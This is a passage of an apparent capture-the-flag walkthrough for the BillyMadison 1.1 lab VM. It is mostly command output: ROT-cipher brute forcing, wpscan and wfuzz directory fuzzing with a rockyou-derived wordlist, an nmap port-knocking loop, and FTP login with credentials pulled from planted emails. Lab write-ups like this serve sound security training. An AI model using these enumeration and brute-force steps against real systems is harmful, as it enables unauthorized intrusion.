</span><span class='line'>getting file <span class="se">\e</span>bd.txt of size <span class="m">35</span> as ebd.txt <span class="o">(</span>1.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.2 KiloBytes/sec<span class="o">)</span>
</span><span class='line'>smb: &gt; <span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Download the file <code>ebd.txt</code> and read it:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# cat ebd.txt
</span><span class='line'>Erics backdoor is currently CLOSED
</span></code></pre></td></tr></table></div></figure></p>

<p>Ok, looks like I need to find a way to active the backdoor.</p>

<p>Now I back to port 23, try to telnet to the target.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 10.1.1.129 23
</span><span class='line'>Trying 10.1.1.129<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'>Escape character is <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span>.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt; HAHAH! You<span class="p">&amp;</span>rsquo<span class="p">;</span>re banned <span class="k">for</span> a <span class="k">while</span>, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke<span class="p">&amp;</span>rsquo<span class="p">;</span>s on you! I don<span class="p">&amp;</span>rsquo<span class="p">;</span>t use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing special found here, but take notes that the target used to use <code>ROT-10</code> cipher with potential key <font color="red"><code>rkfpuzrahngvat</code></font>.</p>

<p>Then I use python script to generate all the ROT strings:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~/</span><span class="n">myTest</span><span class="o">/</span><span class="n">BillyMadison1</span><span class="o">.</span><span class="mi">1</span><span class="c"># cat rot.py&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">translate</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://www.dcode.fr/caesar-cipher&quot;</span> <span class="n">title</span><span class="o">=</span><span class="s">&quot;online Caesar cipher&quot;</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span><span class="p">,</span><span class="n">maketrans</span><span class="p">(</span><span class="n">lowercase</span><span class="p">,</span> <span class="n">lowercase</span><span class="p">[</span><span class="n">n</span><span class="p">:]</span><span class="o">+</span><span class="n">lowercase</span><span class="p">[:</span><span class="n">n</span><span class="p">]))</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Alternatively, here is an <a href="http://www.dcode.fr/caesar-cipher" title="online Caesar cipher">online tool</a></p>

<p>And then run the script with parameter <code>rkfpuzrahngvat</code>, and save the result to file <code>rot-rst.txt</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ./rot.py <span class="p">&amp;</span>ldquo<span class="p">;</span>rkfpuzrahngvat<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> tee rot-rst.txt
</span><span class='line'>rkfpuzrahngvat
</span><span class='line'>slgqvasbiohwbu
</span><span class='line'>tmhrwbtcjpixcv
</span><span class='line'>unisxcudkqjydw
</span><span class='line'>vojtydvelrkzex
</span><span class='line'>wpkuzewfmslafy
</span><span class='line'>xqlvafxgntmbgz
</span><span class='line'>yrmwbgyhouncha
</span><span class='line'>zsnxchzipvodib
</span><span class='line'>atoydiajqwpejc
</span><span class='line'>bupzejbkrxqfkd
</span><span class='line'>cvqafkclsyrgle
</span><span class='line'>dwrbgldmtzshmf
</span><span class='line'>exschmenuating
</span><span class='line'>fytdinfovbujoh
</span><span class='line'>gzuejogpwcvkpi
</span><span class='line'>havfkphqxdwlqj
</span><span class='line'>ibwglqiryexmrk
</span><span class='line'>jcxhmrjszfynsl
</span><span class='line'>kdyinsktagzotm
</span><span class='line'>lezjotlubhapun
</span><span class='line'>mfakpumvcibqvo
</span><span class='line'>ngblqvnwdjcrwp
</span><span class='line'>ohcmrwoxekdsxq
</span><span class='line'>pidnsxpyfletyr
</span><span class='line'>qjeotyqzgmfuzs
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I noticed that a WordPress site is running on port 69, so I use <code>wpscan</code> to do a quick scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wpscan -u &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/&quot;</span>&gt;http://10.1.1.129:69/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ Â®
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.9.2
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The plugins directory <span class="p">&amp;</span>lsquo<span class="p">;</span>wp-content/plugins<span class="p">&amp;</span>rsquo<span class="p">;</span> does not exist.
</span><span class='line'>You can specify one per <span class="nb">command </span>line option <span class="o">(</span>don<span class="p">&amp;</span>rsquo<span class="p">;</span>t forget to include the wp-content directory <span class="k">if</span> needed<span class="o">)</span>
</span><span class='line'><span class="o">[</span>?<span class="o">]</span> Continue? <span class="o">[</span>Y<span class="o">]</span>es <span class="o">[</span>N<span class="o">]</span>o, default: <span class="o">[</span>N<span class="o">]</span>
</span><span class='line'>Y
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/&quot;</span>&gt;http://10.1.1.129:69/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Mon Dec <span class="m">12</span> 06:46:45 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> The WordPress <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/readme.html&quot;</span>&gt;http://10.1.1.129:69/readme.html&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> file exists exposing a version number
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: MadisonHotelsWordpress
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/xmlrpc.php&quot;</span>&gt;http://10.1.1.129:69/xmlrpc.php&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress version 1.0 <span class="o">(</span>Released on 2004-01-03<span class="o">)</span> identified from meta generator, readme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress theme in use: twentyeleven&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Name: twentyeleven
</span><span class='line'> <span class="p">|</span>  Latest version: 2.5
</span><span class='line'> <span class="p">|</span>  Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Readme: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/readme.txt&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/readme.txt&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Changelog: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/changelog.txt&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/changelog.txt&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Style URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/style.css&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/style.css&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Referenced style.css: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/static/wp-content/themes/twentyeleven/style.css&quot;</span>&gt;http://10.1.1.129:69/static/wp-content/themes/twentyeleven/style.css&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Mon Dec <span class="m">12</span> 06:46:45 2016
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 66
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 15.719 MB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing found. :`(</p>

<p>So I moving to port 80 and there is no clue found on the home page but 3 pics, nothing found in the source code as well.</p>

<p>Then I donwloaded the three images and using <code>exiftool</code> to check if anything hidden in them, but no luck.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wfuzz -c <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">hc</span><span class="o">=</span><span class="m">404</span> -z file,/root/myTest/BillyMadison1.1/rot-rst.txt &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/FUZZ&quot;</span>&gt;http://10.1.1.129/FUZZ&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz 2.1.3 - The Web Bruteforcer                      *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/FUZZ&quot;</span>&gt;http://10.1.1.129/FUZZ&lt;/a&gt;
</span><span class='line'>Total requests: 26&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;00008:  <span class="nv">C</span><span class="o">=</span><span class="m">301</span>      <span class="m">9</span> L        <span class="m">28</span> W      <span class="m">317</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>exschmenuating<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Total <span class="nb">time</span>: 1.990103
</span><span class='line'>Processed Requests: 26
</span><span class='line'>Filtered Requests: 25
</span><span class='line'>Requests/sec.: 13.06464
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, found one interesting string <font color="red"><code>exschmenuating</code></font>.</p>

<p><img class="left" src="/downloads/BillyMadison1.1/1.png"></p>

<p>From this page, firstly, I got clues that <code>veronica</code> would be a part of the password, so I filtered out all the word which including <code>veronica</code> from the famous wordlist file <code>rockyou.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# grep <span class="p">&amp;</span>lsquo<span class="p">;</span>veronica<span class="p">&amp;</span>rsquo<span class="p">;</span> /usr/share/wordlists/rockyou.txt &gt; pass.lst
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1# cat pass.lst <span class="p">|</span> wc -l
</span><span class='line'>773
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, there should be a &lsquo;.captured&rsquo; file (which mostly is ended by .cap) in the folder and <code>veronica</code> is part of the file name. So I run <code>wfuzz</code> again to search the captured file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wfuzz -c <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">hc</span><span class="o">=</span><span class="m">404</span> -z file,/root/myTest/BillyMadison1.1/pass.lst &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/exschmenuating/FUZZ.cap&quot;</span>&gt;http://10.1.1.129/exschmenuating/FUZZ.cap&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz 2.1.3 - The Web Bruteforcer                      *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/exschmenuating/FUZZ.cap&quot;</span>&gt;http://10.1.1.129/exschmenuating/FUZZ.cap&lt;/a&gt;
</span><span class='line'>Total requests: 773&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;00522:  <span class="nv">C</span><span class="o">=</span><span class="m">400</span>     <span class="m">10</span> L        <span class="m">35</span> W      <span class="m">302</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>veronica<span class="nv">$%</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00716:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>    <span class="m">192</span> L       <span class="m">722</span> W     <span class="m">8700</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>012987veronica<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00726:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>     <span class="m">24</span> L       <span class="m">162</span> W     <span class="m">1080</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">#0104veronica&amp;rdquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Total <span class="nb">time</span>: 1.617280
</span><span class='line'>Processed Requests: 773
</span><span class='line'>Filtered Requests: 770
</span><span class='line'>Requests/sec.: 477.9627
</span></code></pre></td></tr></table></div></figure></p>

<p>Then donwloaded the captured file <code>http://10.1.1.129/exschmenuating/012987veronica.cap</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RE: VIRUS ALERT!
</span><span class='line'>Eric,
</span><span class='line'>Thanks <span class="k">for</span> your message. I tried to download that file but my antivirus blocked it.
</span><span class='line'>Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the <span class="p">&amp;</span>ldquo<span class="p">;</span>Spanish Armada<span class="p">&amp;</span>rdquo<span class="p">;</span> combo.
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.youtube.com/watch?v=z5YU7JwVy7s&quot;</span>&gt;https://www.youtube.com/watch?v<span class="o">=</span>z5YU7JwVy7s&lt;/a&gt;
</span><span class='line'>QUIT
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I know that the FTP is turned off by default, and need port knocking to activate it. By checking the Youtube video, I got the port knock sequence: <code>1466, 67, 1469 ,1514, 1981, 1986, 1588</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">for</span> x in <span class="m">1466</span> <span class="m">67</span> <span class="m">1469</span> <span class="m">1514</span> <span class="m">1981</span> 1986<span class="p">;</span> <span class="k">do</span> nmap -Pn <span class="p">&amp;</span>ndash<span class="p">;</span>host_timeout <span class="m">201</span> <span class="p">&amp;</span>ndash<span class="p">;</span>max-retries <span class="m">0</span> -p <span class="nv">$x</span> 10.1.1.129<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After knocking the ports, I use <code>nmap</code> to check if the FTP open:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# nmap -p21 -v 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 7.31 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2016-12-13 06:38 EST
</span><span class='line'>Initiating ARP Ping Scan at 06:38
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Completed ARP Ping Scan at 06:38, 0.03s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span><span class='line'>Initiating Parallel DNS resolution of <span class="m">1</span> host. at 06:38
</span><span class='line'>Completed Parallel DNS resolution of <span class="m">1</span> host. at 06:38, 0.00s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 06:38
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.129
</span><span class='line'>Completed SYN Stealth Scan at 06:38, 0.05s elapsed <span class="o">(</span><span class="m">1</span> total ports<span class="o">)</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.24 seconds
</span><span class='line'>           Raw packets sent: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span>
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now the port 21 is open.</p>

<p>From the next email, I found the FTP login information:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Eric,
</span><span class='line'>Thanks <span class="k">for</span> your message. I tried to download that file but my antivirus blocked it.
</span><span class='line'>Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the <span class="p">&amp;</span>ldquo<span class="p">;</span>Spanish Armada<span class="p">&amp;</span>rdquo<span class="p">;</span> combo.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Veronica,
</span><span class='line'>Thanks that will be perfect.  Please <span class="nb">set </span>me up an account with username of <span class="p">&amp;</span>ldquo<span class="p">;</span>eric<span class="p">&amp;</span>rdquo<span class="p">;</span> and password <span class="p">&amp;</span>ldquo<span class="p">;</span>ericdoesntdrinkhisownpee.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Take a note here, the eric&rsquo;s FTP login <font color="red"><code>eric/ericdoesntdrinkhisownpee</code></font></p>

<p>Now I login to the FTP as <code>eric</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ftp 10.1.1.129
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'><span class="m">220</span> Welcome to ColoradoFTP - the open <span class="nb">source </span>FTP server <span class="o">(</span>www.coldcore.com<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.129:root<span class="o">)</span>: eric
